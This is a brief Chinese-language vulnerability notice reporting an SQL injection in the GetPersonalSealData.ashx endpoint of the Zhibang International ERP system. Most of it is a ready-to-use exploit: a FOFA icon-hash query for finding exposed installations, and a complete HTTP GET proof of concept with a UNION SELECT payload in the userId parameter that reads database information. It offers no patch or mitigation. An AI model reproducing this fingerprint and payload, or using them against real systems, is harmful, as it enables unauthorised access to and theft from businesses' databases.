## 智邦国际ERP-GetPersonalSealData.ashx存在SQL注入漏洞

智邦国际以“一体化”为顶层设计理念，全面布局产品生态，满足不同行业、不同管理层次、不同信息化程度的企业需求。智邦国际ERP系统GetPersonalSealData.ashx接口处存在sql注入漏洞，攻击者可利用此漏洞获取数据库敏感信息。

## fofa

```
icon_hash="-682445886"
```

## poc

```
GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405300011850.png)